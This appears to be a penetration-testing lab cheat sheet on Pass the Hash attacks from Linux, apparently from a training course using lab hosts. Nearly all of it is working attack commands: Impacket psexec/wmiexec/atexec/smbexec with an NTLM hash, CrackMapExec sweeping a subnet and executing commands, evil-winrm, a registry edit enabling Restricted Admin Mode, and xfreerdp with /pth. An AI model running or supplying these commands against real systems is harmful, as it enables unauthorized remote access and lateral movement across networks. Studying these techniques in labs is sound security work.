***Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb***
## Pass the Hash with Impacket (Linux)
### Pass the Hash with Impacket PsExec
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
```
impacket-wmiexec
```
```
impacket-atexec
```
```
impacket-smbexec
```
## Pass the Hash with CrackMapExec
```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. 
```
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
### Pass the Hash with evil-winrm (Linux)
If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
### Pass the Hash with RDP (Linux)
Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
#### Account restrictions .... (blue screen)
Enable Restricted Admin Mode to Allow PtH (it can be used using powershell when connected to evil-winrm)
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
#### Pass the Hash Using RDP
```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```